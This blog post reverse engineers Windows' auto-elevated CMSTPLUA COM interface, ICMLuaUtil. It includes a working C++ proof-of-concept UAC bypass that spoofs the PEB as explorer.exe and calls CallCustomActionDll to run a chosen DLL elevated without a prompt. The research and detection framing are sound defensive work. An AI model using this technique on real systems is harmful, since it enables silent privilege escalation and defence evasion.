---
layout: post
title: "Reversing ICMLuaUtil: ShellExec and the Lesser-known CallCustomActionDll for Elevated Execution"
subtitle: "A reverse engineering walkthrough of the auto-elevated COM interface behind CMSTPLUA, including method reconstruction, execution flow analysis, and a proof of concept for elevated DLL execution."
date: 2026-3-27 00:00:00 +0100
categories: [Red team, Reverse-engineering, Windows Internals, Privilege Escalation]
tags: [ICMLuaUtil, UAC bypass, COM Elevation, Reverse Engineering, Windows Internals, Privilege Escalation, CallCustomActionDll, ShellExec, CMSTPLUA, T1548.002]
---

Windows exposes several COM objects that can perform privileged operations through the User Account Control (UAC) elevation mechanism. One such component is CMSTPLUA, implemented in cmlua.dll, which exposes the ICMLuaUtil interface.

While ShellExec from ICMLuaUtil has been referenced in prior UAC bypass research, other methods on the interface remain less explored. In this article, we reverse the COM implementation behind CMSTPLUA, reconstruct the ICMLuaUtil interface, analyze ShellExec, and then focus on the lesser discussed CallCustomActionDll method to understand how it loads and invokes code from a user-supplied DLL in an elevated COM context.

## Elevation via COM
Unlike standard elevation mechanisms which require user interaction, certain COM objects can be instantiated in the elevated context through the COM elevation moniker.

The COM Elevation Moniker is a Windows mechanism allowing standard users to activate specific COM classes with elevated administrator privileges. It enables applications to perform administrative tasks, such as managing TPM virtual smart cards, by triggering a User Account Control (UAC) prompt for consent or credentials.

When a client requests an Object using 
```
Elevation:Administrator!new:{CLSID}
```
the request is handled by the  COM server with high integrity and returns an interface pointer to the caller.

The CLSID is a globally unique 128-bit value represented as a GUID that uniquely identifies a COM class. in practice, it tells windows which COM object to instantiate. The IID identifies a specific interface exposed by that object. These identifiers are commonly stored in the Windows Registry under **HKCR\CLSID** and **HKCR\interface** and can also be recovered during reverse engineering from symbols, type libraries or hardcoded GUID references in binary.

For this research, the relevant identifiers are:

```
CLSID_CMSTPLUA = {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
IID_ICMLuaUtil = {6EDD6D74-C007-4E75-B76A-E5740995E24C}
```


The COM class implemented by CMSTPLUA (cmlua.dll) is one such component. Because it is marked as auto-elevated, its methods execute with administrative privileges when invoked through the appropriate COM activation mechanism.
## Identifying the ICMLuaUtil COM Interface

ICMLuaUtil is the main interfaceexposed by CMSTPLUA. After loading the module into Ghidra and applying public symbols, The CCMLuaUtil class becomes visible along with its associated virtual function table

![Ghidra Showing Vtable](/assets/images/reversing-icmluautil/ghidraVtable.png)
*Figure 1.1 Ghidra Screenshot showing vtable*

We can reconstruct the methods exposed through the ICMLuaUtil interface by  examining the vtable.

## Reconstructing the ICMLuaUtil Interface

During analysis of the COM object implemented by CMSTPLUA, the following methods were identified based on the recovered vtable layout and function usage, the interface can be reconstructed as follows:

```
interface ICMLuaUtil : IUnknown
{
	HRESULT QueryInterface(_GUID * param_1, void * * param_2)
	HRESULT AddRef()
	HRESULT  Release()

	HRESULT  SetRasCredentials(ushort * param_1, ushort * param_2, ushort * param_3, int param_4)
	HRESULT  SetRasEntryProperties(ushort * param_1, ushort * param_2, ushort * * param_3, ulong param_4)
	HRESULT  DeleteRasEntry(ushort * param_1, ushort * param_2)
	HRESULT  LaunchInfSection(ushort * param_1, ushort * param_2, ushort * param_3, int param_4)
	HRESULT  LaunchInfSectionEx(ushort * param_1, ushort * param_2, ulong param_3)
	HRESULT  CreateLayerDirectory(short * param_1)
	HRESULT  ShellExec(ushort * param_1, ushort * param_2, ushort * param_3, ulong param_4, ulong param_5)
	HRESULT  SetRegistryStringValue(int param_1, ushort * param_2, ushort * param_3, ushort * param_4)
	HRESULT  DeleteRegistryStringValue(int param_1, ushort * param_2, ushort * param_3)
	HRESULT  DeleteRegKeysWithoutSubKeys(int param_1, ushort * param_2, int param_3)
	HRESULT  DeleteRegTree(CMLuaUtil *this, int param_1, ushort * param_2)
	HRESULT  ExitWindowsFunc()
	HRESULT  AllowAccessToTheWorld(ushort * param_1)
	HRESULT  CreateFileAndClose(ushort * param_1, ulong param_2, ulong param_3, ulong param_4, ulong param_5)
	HRESULT  DeleteHiddenCmProfileFiles(ushort * param_1)
	HRESULT  CallCustomActionDll(ushort * param_1, ushort * param_2, ushort * param_3, ushort * param_4, ulong * param_5)
	HRESULT  RunCustomActionExe(ushort * param_1, ushort * param_2, ushort * * param_3)
	HRESULT  SetRasSubEntryProperties(ushort * param_1, ushort * param_2, ulong param_3, ushort * * param_4, ulong param_5)
	HRESULT  DeleteRasSubEntry(ushort * param_1, ushort * param_2, ulong param_3)
	HRESULT  SetCustomAuthData(ushort * param_1, ushort * param_2, ushort * param_3, ulong param_4)
}
```

In the Fig 1.1 above although the vtable entry following QueryInterface was not labeled in the Symbol information, COM Interface conventions indicate that the second entry must correspond to AddRef. Inspecting the referenced function confirmed this assumption.


## ShellExec

ShellExec is one of the most well-known method exposed by the ICMLuaUtil interface and has been widely referenced in prior UAC bypass research. It provides the ability to launch processes from within the context of COM server. To understand its behavior, we analyze its implementation within cmlua.dll and trace how it invokes underlying Windows APIs.

Following the vtable and jumping to the ShellExec method in Ghidra we land at the disassembly for the function, from the function call graph, we examine the outgoing calls made by ShellExec to identify its underlying behavior.

![Ghidra Screenshot showing outgoing calls](/assets/images/reversing-icmluautil/ShellExecOutgoingCalls.png)
*Figure 1.2 Ghidra screenshot showing outgoing calls made by ShellExec*

In the figure 1.2 above we can see it calls functions like
- memset
- ShellExecuteExW
- WaitForSingleObject
- CloseHandle
- GetLastError

Among these ShellExecuteExW seems to be the most interesting function called here,  It is responsible for process creation. This suggests that ShellExec acts as a wrapper around ShellExecuteExW, delegating execution to the Windows API while operating within an elevated COM context.

### Reconstructing the ShellExecuteExW Call
Since ShellExecuteExW expects a pointer to a SHELLEXECUTEINFOW structure, the next step is to identify how this  structure is constructed within ShellExec.

By analyzing the disassembly, we observe that the function initializes a structure on the stack and populates its fields before passing it to ShellExecuteExW.

According to the Microsoft documentation for the ShellExecuteExW, this function accepts a single parameter which is a pointer to a SHELLEXECUTEINFOW structure

```
BOOL ShellExecuteExW(
  [in, out] SHELLEXECUTEINFOW *pExecInfo
);
```

Luckily this structure is also documented in the MSDN as having the following members:
```
typedef struct _SHELLEXECUTEINFOW {
  DWORD     cbSize;
  ULONG     fMask;
  HWND      hwnd;
  LPCWSTR   lpVerb;
  LPCWSTR   lpFile;
  LPCWSTR   lpParameters;
  LPCWSTR   lpDirectory;
  int       nShow;
  HINSTANCE hInstApp;
  void      *lpIDList;
  LPCWSTR   lpClass;
  HKEY      hkeyClass;
  DWORD     dwHotKey;
  union {
    HANDLE hIcon;
    HANDLE hMonitor;
  } DUMMYUNIONNAME;
  HANDLE    hProcess;
} SHELLEXECUTEINFOW, *LPSHELLEXECUTEINFOW;
```

To improve readability, the SHELLEXECUTEINFOW structure definition was applied to the corresponding stack region. This allows us to clearly map individual fields to their respective values.

```
long __thiscall
CCMLuaUtil::ShellExec
          (CCMLuaUtil *this,ushort *param_1,ushort *param_2,ushort *param_3,ulong param_4,
          ulong param_5)

{
  BOOL BVar1;
  DWORD DVar2;
  SHELLEXECUTEINFOW local_78;
  
  memset(&local_78,0,0x70);
  local_78.fMask = param_4;
  local_78.nShow = param_5;
  local_78.cbSize = 0x70;
  local_78.lpFile = (LPCWSTR)param_1;
  local_78.lpParameters = (LPCWSTR)param_2;
  local_78.lpDirectory = (LPCWSTR)param_3;
  BVar1 = ShellExecuteExW(&local_78);
  DVar2 = 0;
  if (BVar1 == 0) {
    DVar2 = GetLastError();
    if (0 < (int)DVar2) {
      DVar2 = DVar2 & 0xffff | 0x80070000;
    }
    if (-1 < (int)DVar2) {
      DVar2 = 0x8000ffff;
    }
  }
  else if (local_78.hProcess != (HANDLE)0x0) {
    WaitForSingleObject(local_78.hProcess,60000);
    CloseHandle(local_78.hProcess);
  }
  return DVar2;
}

```

The function above from the decompiler tab clearly shows how the parameters are passed from ShellExec to build the SHELLEXECUTEINFOW structure passed to the ShellExecuteExW function using this we can map out the ShellExec Function properly as 
```
ShellExec(
    CCMLuaUtil* this, 
    LPCWSTR lpFile, 
    LPCWSTR lpParameters, 
    LPCWSTR lpDirectory, 
    ULONG fMask,
    int nShow
);
```

Notably, the lpVerb field of the SHELLEXECUTEINFOW structure is never explicitly set within ShellExec. Since the structure is  zero-initialized using memset, lpVerb remains NULL. 

This indicates that ShellExec does not explicitly request elevation through the "runas" verb. Instead, process execution occurs within the security context of the elevated COM  server itself.

This highlights an important aspect of COM-based elevation, the privilege boundary is crossed during COM activation rather than at process execution time. As a result, ShellExecuteExW does not need to request elevation explicitly, as it is already executing within a high integrity process.

Additionally, no significant validation is performed on input parameters before they are propagated into the SHELLEXECUTEINFOW structure. This allows a caller to fully control the lpFile, lpParameters and lpDirectory fields, enabling arbitrary process execution through the elevated COM interface.

In Summary, ShellExec provides a direct interface for process execution by forwarding user-controlled parameters into ShellExecuteExW within an elevated COM context. The absence of additional validation or explicit elevation requests further demonstrates how COM-based mechanisms can be  leveraged for privileged execution.

ShellExec has been widely used in prior UAC bypass research techniques and its behavior is well documented in public research. For a demonstration of its usage, readers can refer to existing work such as the UACME project.

## CallCustomActionDll
While ShellExec has been widely analyzed in prior research, other methods exposed by the ICMLuaUtil interface remain less explored. One such method is CallCustomActionDll, which appears to provide the ability to execute code from a specified DLL.

In this section, we reverse its implementation to understand how it behaves and whether it can be leveraged for code execution within an elevated COM context.

Following the vtable to the Functions disassembly, we can examine the Functions call graph, specifically outgoing calls to understand its behavior 

![Ghidra Screenshot showing outgoing calls](/assets/images/reversing-icmluautil/CallCustomActionDll.png)
*Figure 1.2 Ghidra screenshot showing outgoing calls made by CallCustomActionDll*

- LoadLibraryExW
- GetLastError
- MyDbgPrintfW
- WzToSzWithAlloc
- FreeLibrary
- GetProcAddress
- CmFree
- ConvertStringToBinary
- _guard_xfg_dispatch_icall_nop

Among these functions **LoadLibraryExW** and **GetProcAddress** are particularly significant as they indicate that the function dynamically loads a user-supplied DLL and resolves an exported function at runtime. This suggests that CallCustomActionDll may provide a mechanism for executing arbitrary code within the elevated COM context.

From the disassembly we can correctly map out the Method signature types and parameters by tracing how they are used within the function

The first function called within CallCustomActionDll is LoadLibraryExW which has a function signature documented in MSDN as 
```
HMODULE LoadLibraryExW(
	[in] LPCWSTR lpLibFileName,
		 HMODULE hFile,
	[in] DWORD dwFlags
)
```

The function calls LoadLibrary passing in the lpLibFileName directly from the user controlled paramter. The file which is a DLL is loaded with dwFlags set to 0, indicating standard loading behaviour . This means the DLL is loaded as an executable module without any restrictions, allowing its exported functions to be invoked normally.


```
    hModule = LoadLibraryExW(lpLibFileName,(HANDLE)0x0,0);
  if (hModule == (HMODULE)0x0) {
    errorCode = GetLastError();
    errorMessage = L"RunAsDll() LoadLibrary(%s) failed, GLE=%u.";
  }
  else {
    lpProcName = (LPCSTR)WzToSzWithAlloc(lpProcNameW);
    if (lpProcName != (LPCSTR)0x0) {
      addressOfFunction = GetProcAddress(hModule,lpProcName);
      CmFree();
      if (addressOfFunction == (FARPROC)0x0) {
        lVar5 = -0x7ff8ffff;
        GetLastError();
        if (lpProcNameW == (LPWSTR)0x0) {
          lpProcNameW = L"(null)";
        }
```
The function then calls  WzToSzWithAlloc passing in the second parameter to be converted from a wide char array to a char array before passing it to the GetProcAddress Function.

The GetProcAddress Function is documented in MSDN with the following signature 

```
FARPROC GetProcAddress(
	[in] HMODULE hModule,
	[in] LPCSTR  lpProcName
);
```
This clearly shows the second parameter is the name of the function converted from LPCWSTR to LPCSTR and the resulting function address is saved to a local variable we renamed to addressOfFunction

Now we have confirmed that the DLL is loaded without restrictive flags and the library path is user-controlled, the function also does not validate inputs before calling GetProcAddress. it only validates after failure.

```
        param3ConvertedToLPCSTR = (LPCSTR)WzToSzWithAlloc(param_3);
        param_5._0_4_ = 0;
        ConvertedBinaryFromString = (BYTE *)ConvertStringToBinary((longlong)param_4,(int *)&param_5)
        ;
        if (ConvertedBinaryFromString == (BYTE *)0x0) {
          uVar3 = 0;
        }
        else {
          uVar3 = *(undefined8 *)ConvertedBinaryFromString;
        }
```

WzToSzWithAlloc is then called again passing in the third parameter from the method effectively converting it from a Wide character string to an ANSI string.

The fourth parameter is passed through an internal ConvertStringToBinary routine, which appears to parse a string representation of binary data into a raw byte buffer. In the observed implementation, only the first 8 bytes are subsequently interpreted as a 64-bit value and forwarded to the target export.

The function pointer gotten from the call to GetProcAddress is used to dynamically call a function passing in three arguments:  the 64-bit value derived from a hex-encoded string, the module handle, and an ANSI string derived from the third parameter to CallCustomActionDll allowing user-controlled string arguments to be supplied.

```
uVar2 = (*addressOfFunction)(uVar3,hModule,param3ConvertedToLPCSTR);
```

The method invokes the resolved target export using a fixed calling pattern with three arguments. While this does not enforce a strict function signature at compile time, the target function must be compatible with this calling convention to execute correctly. Any mismatch in expected parameters or calling convention may result in undefined behavior.


```
CallCustomActionDll(
    CCMLuaUtil *this,
	LPCWSTR lpLibFileName,
	LPCWSTR lpProcNameW,
	LPCWSTR arguments,
	LPCWSTR hexEncodedString, 
	ulong * result
	);
```


## Building a Proof of Concept for CallCustomActionDll

To demonstrate this in action, we build a simple elevated DLL loader. The POC consists of two parts:
- The payload DLL - A basic DLL with an exported function that matches the expected signature
- The Client - A medium integrity executable that activates the elevated ICMLuaUtil interface via the COM Elevation Moniker and calls CallCustomActionDll
#### The Payload DLL

```
#include <Windows.h>
#include <stdio.h>

static BOOL g_initialized = FALSE;

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:

        OutputDebugStringA("testDll Attached");
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

BOOL isProcessElevated()
{
    BOOL fisElevated = FALSE;
    HANDLE hToken = NULL;
    TOKEN_ELEVATION elevation = { 0 };
    DWORD dwSize = 0;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
        {
            fisElevated = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return fisElevated;
}

extern "C" __declspec(dllexport)
DWORD testFunction(ULONG arg1, HMODULE hModule, LPCSTR arg3)
{
    if (AllocConsole())
    {
        FILE* pConsole;
        freopen_s(&pConsole, "CONOUT$", "w", stdout);
        freopen_s(&pConsole, "CONOUT$", "w", stderr);
        freopen_s(&pConsole, "CONIN$", "r", stdin);

        SetConsoleTitle(L"Dll Debug Console");

    }
    else
        OutputDebugStringA("[+] TestDLL Failed to CreateConsole\n");

    if (isProcessElevated())
        printf("[+] Process is Elevated \n");
    else
        printf("{+] Process is not Elevated\n");

    printf("[+] Printing params ...\n");
    printf("[+] arg1 (hex) : 0x%p\n[+] arg1 (uint64): %llu\n", (void*)arg1, (unsigned long long)arg1);

    if (arg3)
        printf("[+] arg3: %s\n", arg3);
    else
        printf("[+] arg3: (null)\n");

    printf("[+] DONE ... \n");

    return 0;
}
```
The helper function:  ***BOOL isProcessElevated()*** calls ***OpenProcessToken*** and ***GetTokenInformation***to determine whether the current process is running with an elevated token.

###### Matching the Expected Export Signature
One of the most important implementation details is that the exported function inside the DLL must be compatible with the invocation pattern used by  CallCustomActionDll

From reversing, the resolved function is ultimately called as:
```
(*addressOfFunction)(uVar3,hModule,param3ConvertedToLPCSTR);
```
This means the export should be compatible with a function signature similar to 
```
extern "C" __declspec(dllexport)
DWORD testFunction(ULONG arg1, HMODULE hModule, LPCSTR arg3)
```
The function is declared with an ***extern "C"*** to avoid name mangling and ensure export can be resolved correctly with GetProcAddress.

For demonstration purposes, the exported function only performs basic diagnostics and argument inspection.
#### The Client/Loader
The second part of the POC is a client application responsible for activating the elevated COM object and invoking the CallCustomActionDll Method.

At a high level the client application simply:
- Masquerades its process metadata as explorer.exe
- Initializes COM 
- Activates the elevated ICMLuaUtil Object using the COM Elevation Moniker
- Invokes CallCustomActionDll with user controlled DLL path, export name, and arguments.

###### Defining the Interface
Since ICMLuaUtil is not conveniently exposed through a public SDK header, the interface was reconstructed manually from the recovered vtable.

```
struct _declspec(uuid("{6EDD6D74-C007-4E75-B76A-E5740995E24C}"))
	ICMLuaUtil : public IUnknown {
	virtual HRESULT __stdcall QueryInterface(REFIID, PVOID*) = 0;
	virtual ULONG __stdcall AddRef() = 0;
	virtual ULONG __stdcall Release() = 0;

	virtual HRESULT  __stdcall SetRasCredentials( LPCWSTR param_1, LPCWSTR param_2, LPCWSTR param_3, int param_4) = 0;
	virtual HRESULT  __stdcall SetRasEntryProperties(LPCWSTR param_1, LPCWSTR param_2, LPCWSTR* param_3, ULONG param_4) = 0;
	virtual HRESULT  __stdcall DeleteRasEntry(LPCWSTR param_1, LPCWSTR param_2) = 0;
	virtual HRESULT  __stdcall LaunchInfSection(LPCWSTR param_1, LPCWSTR param_2, LPCWSTR param_3, int param_4) = 0;
	virtual HRESULT  __stdcall LaunchInfSectionEx(LPCWSTR param_1, LPCWSTR param_2, ULONG param_3) = 0;
	virtual HRESULT  __stdcall CreateLayerDirectory(  LPCWSTR param_1) = 0;
	virtual HRESULT  __stdcall ShellExec(  LPCWSTR param_1, LPCWSTR param_2, LPCWSTR param_3, ULONG param_4, ULONG param_5) = 0;
	virtual HRESULT  __stdcall SetRegistryStringValue(  int param_1, LPCWSTR param_2, LPCWSTR param_3, LPCWSTR param_4) = 0;
	virtual HRESULT  __stdcall DeleteRegistryStringValue(  int param_1, LPCWSTR param_2, LPCWSTR param_3) = 0;
	virtual HRESULT  __stdcall DeleteRegKeysWithoutSubKeys(  int param_1, LPCWSTR param_2, int param_3) = 0;
	virtual HRESULT  __stdcall DeleteRegTree( int param_1, LPCWSTR param_2) = 0;
	virtual HRESULT  __stdcall ExitWindowsFunc(  ) = 0;
	virtual HRESULT  __stdcall AllowAccessToTheWorld(  LPCWSTR param_1) = 0;
	virtual HRESULT  __stdcall CreateFileAndClose(  LPCWSTR param_1, ULONG param_2, ULONG param_3, ULONG param_4, ULONG param_5) = 0;
	virtual HRESULT  __stdcall DeleteHiddenCmProfileFiles(  LPCWSTR param_1) = 0;
	virtual HRESULT  __stdcall CallCustomActionDll(  LPCWSTR param_1, LPCWSTR param_2, LPCWSTR param_3, LPCWSTR param_4, ULONG* param_5) = 0;
	virtual HRESULT  __stdcall RunCustomActionExe(  LPCWSTR param_1, LPCWSTR param_2, LPCWSTR* param_3) = 0;
	virtual HRESULT  __stdcall SetRasSubEntryProperties(  LPCWSTR param_1, LPCWSTR param_2, ULONG param_3, LPCWSTR* param_4, ULONG param_5) = 0;
	virtual HRESULT  __stdcall DeleteRasSubEntry(  LPCWSTR param_1, LPCWSTR param_2, ULONG param_3) = 0;
	virtual HRESULT  __stdcall SetCustomAuthData(  LPCWSTR param_1, LPCWSTR param_2, LPCWSTR param_3, ULONG param_4) = 0;

};
```

###### Masquerading the Process as explorer.exe
During testing, simply calling the COM elevation moniker from a normal medium-integrity process did not always result in silent activation. In some cases, a UAC prompt was still displayed.

However, after modifying the process metadata to resemble explorer.exe, the elevated COM object could be instantiated without prompting.

This is important because it highlights that the elevation decision is not based solely on the requested COM classes, but can also depend on who appears to be making the request.

In practice, this means the client modifies selected fields in its own Process Environment Block (PEB), including:
- ProcessParameters->ImagePathName
- ProccessParameters->CommandLine
- Loader metadata such as
	- FullDllName
	- BaseDllName

This does not replace the executable on disk or transform the process into real explorer. it simply alters the in-memory metadata used by Windows components during  trust and activation checks.

The client performs this masquerading before COM is initialized.
```
    PWCHAR buffer = NULL;
    
    if (!MasqueradePebAsExplorer(&Buffer))
    {
        printf("[-] MasqueradePebAsExplorer Failed");
        goto _EXIT_ROUTINE;
    }
```
The helper itself is fairly long because it requires walking the PEB, reconstructing internal structures, and updating the relevant Unicode strings while holding the appropriate process lock.

A simplified version of the key logic is shown below 
```
RtlEnterCriticalSection((PRTL_CRITICAL_SECTION)Peb->FastPebLock);

    RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, *Buffer);
    RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, *Buffer);

    RtlInitUnicodeString(&InMemoryBinaryLoaderData->FullDllName, *Buffer);
    RtlInitUnicodeString(&InMemoryBinaryLoaderData->BaseDllName, *Buffer);

    RtlLeaveCriticalSection((PRTL_CRITICAL_SECTION)Peb->FastPebLock);
```
in this POC, Buffer ultimately points to:
```
C:\Windows\explorer.exe
```
This is enough to make the current process present itself as Explorer  from the perspective of the relevant metadata.

###### Initializing COM and Requesting the Elevated Object
With masquerading step complete, the next stage is to initialize COM and request the elevated ICMLuaUtil Object using the COM Elevation Moniker.

The Moniker string used for activation is:
```
	WCHAR ElevationMonikerString[256] = L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";
```

The CLSID **{3E5FC7F9-9A51-4367-9063-A120244FBEC7}** corresponds to the COM class implemented by CMSTPLUA, which exposes the ICMLuaUtil Interface.

Before calling CoGetObject, a BIND_OPTS3 structure is initialized:

```
	BIND_OPTS3 BindOpts;
	ZeroMemory(&BindOpts, sizeof(BindOpts));

    BindOpts.cbStruct = sizeof(BindOpts);
    BindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;
```

This ensures COM activates the object as an out-of-process local server, which is expected for this COM component.

COM is then initialized for the current thread:
```
    hResult = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (!SUCCEEDED(hResult))
    {
        printf("[-] CoInitializeEx Failed With Error: 0x%08X\n", hResult);
        goto _EXIT_ROUTINE;
    }
```

Finally, the client requests the elevated interface pointer:

```
ICMLuaUtil *Util = NULL;

hResult = CoGetObject(
ElevationMonikerString, 
&BindOpts,
IID_ICMLuaUtil,
(PVOID*)&Util
);

    if (!SUCCEEDED(hResult))
    {
        printf("[+] CoGetObject Failed With Error 0x%08X\n", hResult);
        goto _EXIT_ROUTINE;
    }
```

if this succeeds, Util now points to an elevated instance of ICMLuaUtil, hosted in a high integrity COM server process.

During testing, this activation succeeds without UAC prompt once the process metadata has been masqueraded as explorer.exe

###### Invoking CallCustomActionDll
With the elevated COM interface available, invoking CallCustomActionDll becomes straightforward.
The POC supplies:
- A path to the DLL to be Loaded
- The name of the exported function to resolve
- A string argument to pass through
- An optional hex-encoded string parameter
- An output  buffer

The core call looks like this:

```
ULONG outParam = 0;
LPCWSTR dllPath = DLL_PATH;
LPCWSTR exportName = EXPORTED_FUNCTION_NAME;
LPCWSTR param3 = L"ThisIsATestArgument";
LPCWSTR param4 = L"";

hResult = Util->CallCustomActionDll(
	dllPath, 
	exportName, 
	param3, 
	param4, 
	outParam
);

if (!SUCCEEDED(hResult))
    printf("[-] CallCustomActionDll Failed With Error 0x%08X\n", hResult);
else
{
	printf("[+] CallCustomActionDll Succeeded\n");
	printf("[+] OutParam: 0x%08X\n", outParam);
}


```
Each parameter maps closely to the behavior observed during reversing:
- dllPath -> Path passed directly to LoadLibraryExW
- exportName ->wide-character function name later converted internally before being passed to GetProcAddress.
- param3 -> user controlled string later converted and forwarded to export
- param4 -> string processed by ConvertStringToBinary, where the first 8 bytes are interpreted as a 64-bit value
- outParam -> output buffer written by the COM method.

In testing, an empty string for `param4` was sufficient. However, incorrect parameter typing can still cause RPC marshalling failures before the DLL is ever loaded.

###### Full main() Function
For completeness, the core loader logic is shown below
```
#define DLL_PATH L"C:\test\testDll.Dll"
#define EXPORTED_FUNCTION_NAME L"testFunction"

int main()
{
	HRESULT hResult = S_OK;
	PWCHAR Buffer = NULL;
	LPCWSTR Out = NULL;
	ICMLuaUtil* Util = NULL;
    	ULONG* outParam = (ULONG*)malloc(sizeof(ULONG));
    	HMODULE hModule = NULL;
    	BIND_OPTS3 BindOpts;
    	*outParam = 0;
    
    
	LPCWSTR dllPath = DLL_PATH;
	LPCWSTR exportName = EXPORTED_FUNCTION_NAME;
	LPCWSTR param3 = L"ThisIsATestArgument";
	LPCWSTR param4 = L"";


	WCHAR ElevationMonikerString[200] = L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";
	

	ZeroMemory(&BindOpts, sizeof(BindOpts));
    BindOpts.cbStruct = sizeof(BindOpts);
    BindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;


    if (!MasqueradePebAsExplorer(&Buffer))
    {
        printf("[-] MasqueradePebAsExplorer Failed");
        goto _EXIT_ROUTINE;
    }


    hResult = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (!SUCCEEDED(hResult))
    {
        printf("[-] CoInitializeEx Failed With Error: 0x%08X\n", hResult);
        goto _EXIT_ROUTINE;
    }
    
    hResult = CoGetObject(
	    ElevationMonikerString,
	    &BindOpts, 
	    IID_ICMLuaUtil, 
	    (PVOID*)&Util
	);
	
    if (!SUCCEEDED(hResult))
    {
        printf("[+] CoGetObject Failed With Error 0x%08X\n", hResult);
        goto _EXIT_ROUTINE;
    }


 hResult = Util->CallCustomActionDll(
	dllPath, 
	exportName, 
	param3, 
	param4, 
	outParam
);

if (!SUCCEEDED(hResult))
    printf("[-] CallCustomActionDll Failed With Error 0x%08X\n", hResult);
else
{
	printf("[+] CallCustomActionDll Succeeded\n");
	printf("[+] OutParam: 0x%08X\n", outParam);
}

_EXIT_ROUTINE:
    if (Buffer)
        HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, Buffer);

    if (Out)
        CoTaskMemFree((LPVOID)Out);

    if (Util)
        Util->Release();

    CoUninitialize();

    return ERROR_SUCCESS;

	return 0;
}
```
The full source is provided in the [Github Link](https://github.com/coded-intruder/CallCustomActionDll-POC)

#### Observed Behavior
When executed, the POC successfully:
- Activated the elevated ICMLuaUtil COM object
- Loaded the test DLL into an elevated dllhost.exe
- Resolved the exported function
- Invoked the export without displaying UAC

The DLL confirmed execution through debug output and runtime checks, validating that CallCustomActionDll also exposes a powerful and flexible path for code execution once the elevated interface has been obtained

![POC screenshot](/assets/images/reversing-icmluautil/POC_screenshot.png)
*Figure 1.3 Console output showing DLL run Elevated, Printing arguments*

in Figure 1.3 the console output confirms that CallCustomActionDll loads and invokes a user-supplied export within the elevated COM server context. The supplied DLL was loaded into an elevated dllhost.exe instance and the exported function successfully invoked. Because the implementation later calls FreeLibrary, the DLL is only present briefly in the target process and may not remain visible in process inspection tools unless observed at the right moment.

### Security Impact

While ShellExec exposed through ICMLuaUtil has received significantly more public attention, CallCustomActionDll demonstrates that the interface provides a broader execution surface than is often discussed.
 
From a security perspective, the method is impactful for several reasons:
	•	it accepts a user-controlled DLL path
	•	it resolves a user-controlled exported function
	•	it forwards attacker-controlled arguments
	•	execution occurs inside an elevated COM server context
 
In practice, this means a medium-integrity process can cause arbitrary DLL code to execute in a high-integrity process once the elevated COM object has been successfully obtained.
 
This makes the method useful not only for privilege escalation, but also for defense evasion, since execution occurs under a trusted Windows COM hosting process rather than directly inside the originating client.
 
Although this proof of concept uses a benign DLL that simply prints debug output, the same primitive could be adapted to run more complex post-exploitation logic.

### MITRE ATT&CK Mapping
The behavior demonstrated in this POC mostly closely maps to:
T1548.002 -- Abusing Elevation Control Mechanism: Bypass User Account Control.

#### Secondary Defensive Framing
Depending on how the primitive is operationalized defenders may also view related behavior through:
- Execution under a trusted Windows host process
- Suspicious DLL loading into elevated process
- Unexpected COM object activation followed by module load events.

This is relevant because the POC results in a DLL being loaded into dllhost.exe which may appear less suspicious than direct elevated process creation from the original client.

Note: This research is shared for reverse engineering, defensive understanding, and detection-focused analysis of Windows auto-elevated COM behavior. The proof of concept is intended to validate implementation behavior in a controlled lab environment.



